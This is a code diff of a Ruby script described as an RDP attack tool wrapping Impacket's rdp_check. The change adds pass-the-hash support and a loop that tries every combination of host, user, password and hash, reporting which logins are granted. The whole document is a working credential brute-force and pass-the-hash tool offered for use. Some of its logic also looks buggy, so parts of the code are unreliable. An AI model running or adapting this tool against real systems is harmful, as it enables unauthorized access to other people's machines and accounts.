@@ -1,13 +1,11 @@
 #!/usr/bin/env ruby
 #Terminator is an RDP attack tool which wraps Impackets rdp_check.
-
+#HASHES:
 require 'trollop'
 require 'colorize'
 require 'logger'
 require 'tty-command'
 
-log         = Logger.new('debug.log')
-@cmd        = TTY::Command.new(output: log)
 @tooldir    = File.expand_path(File.dirname(__FILE__))
 @rdp_check  = "#{@tooldir}/rdp_check.py"
 
@@ -24,6 +22,8 @@ def arguments
     opt :users,  "Provide a list of usernames",  :type => String, :short => "-U"
     opt :pass,   "Provide a password",  :type => String, :short => "-p"
     opt :passes, "Provide a list of passwords",  :type => String, :short => "-P"
+    opt :hash,   "Provide a hash instead of a password", :type => String, :short => "-n"
+    opt :hashes, "Provide a list of hashes instead of a password", :type => String, :short => "-N"
     opt :domain, "Domain or workgroup", :short => "-d",  :default => "WORKGROUP"
 
     if ARGV.empty?
@@ -57,21 +57,56 @@ def passlist
   end
 end
 
-def rdp_attack
+def hashlist
+  if @opts[:hashes]
+    passwords = File.readlines(@opts[:hashes]).map(&:chomp &&:strip)
+  else
+    passwords = [@opts[:hash].to_s]
+  end
+end
+
+def creds_combo
+  final_creds = []
+  userlist.each do |user|
+    passlist.each do |pass|
+      hashlist.each do |hash|
+        final_creds << [user, pass, hash]
+
+      end
+    end
+  end
+  final_creds.each {|a| a.reject!(&:empty?)}
+end
+
+def tty_command(command, timeout)
+  @command = command
+  log      = Logger.new('debug.log')
+  cmd      = TTY::Command.new(output: log, timeout: timeout)
+  result   = cmd.run!(command)
+  @out     = result.out
+  @err     = result.err
+  rescue TTY::Command::TimeoutExceeded => @timeout_error
+  puts "Timeout: #{@command}".red.bold if @timeout_error
+end
+
+def run_command
   hostlist.each do |host|
-    userlist.each do |user|
-      passlist.each do |pass|
-        out, err = @cmd.run!("#{@rdp_check} #{@opts[:domain]}/#{user}:'#{pass}'@#{host}")
-        status = out.split("\n\n")[1]
-        if status =~ /Access Granted/
-          puts "[*]#{host}:#{user}:#{pass} - SUCCESS".green.bold
-        else
-          puts "[-]#{host}:#{user}:#{pass} - FAILED".red.bold
-        end
+    creds_combo.each do |creds|
+      if @opts[:hash] or @opts[:hashes]
+        command = "#{@rdp_check} -hashes=#{creds[1]} #{@opts[:domain]}/#{creds[0]}:@#{host}"
+      else
+        command = "#{@rdp_check} #{@opts[:domain]}/#{creds[0]}:'#{creds[1]}'@#{host}"
+      end
+      tty_command(command, 10)
+      if @out =~ /Access Granted/
+        puts "ACCESS GRANTED: #{host}:#{creds[0]}:#{creds[1]} ".green.bold
+      else
+        puts "NOPE #{host}:#{creds[0]}:#{creds[1]}".red.bold
       end
     end
   end
 end
 
+
 arguments
-rdp_attack
+run_command
